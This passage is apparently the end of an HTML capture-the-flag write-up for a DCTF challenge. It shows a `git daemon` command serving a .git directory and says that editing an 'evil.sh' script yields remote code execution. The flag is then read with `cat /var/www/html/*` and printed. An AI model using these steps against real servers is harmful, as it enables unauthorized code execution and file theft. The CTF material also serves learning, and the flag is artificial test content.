+<pre class="hljs"><code><span class="hljs-comment">git</span> <span class="hljs-comment">daemon</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">port=11992</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">verbose</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">export</span><span class="hljs-literal">-</span><span class="hljs-comment">all</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">base</span><span class="hljs-literal">-</span><span class="hljs-comment">path=</span><span class="hljs-string">.</span><span class="hljs-comment">git</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">reuseaddr</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">strict</span><span class="hljs-literal">-</span><span class="hljs-comment">paths</span> <span class="hljs-string">.</span><span class="hljs-comment">git/</span></code></pre><p>Refer to <a href="https://railsware.com/blog/2013/09/19/taming-the-git-daemon-to-quickly-share-git-repository/">this blog</a>.</p>
+<p>Just modify evil.sh and it&#39;s easy to RCE. The flag is in one of the php files in <code>/var/www/html/</code>. We just <code>cat /var/www/html/*</code> and get the flag:)</p>
+<p>Flag: <code>DCTF{4a49b863ba931ac65b077a504b973d9ddab4f343b00651a0b4ff9b8d7575f41f}</code></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
